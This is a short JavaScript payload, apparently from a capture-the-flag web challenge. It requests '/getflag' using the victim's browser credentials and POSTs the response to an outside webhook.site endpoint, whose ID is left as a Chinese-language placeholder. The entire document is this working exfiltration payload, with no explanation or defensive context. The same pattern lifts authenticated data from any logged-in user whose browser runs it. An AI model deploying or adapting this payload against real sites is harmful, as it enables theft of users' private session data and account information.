fetch("/getflag", { credentials: "include" })
  .then(r => r.text())
  .then(flag => {
    fetch("https://webhook.site/你的ID", {
      method: "POST",
      mode: "no-cors",
      body: flag
    });
  });
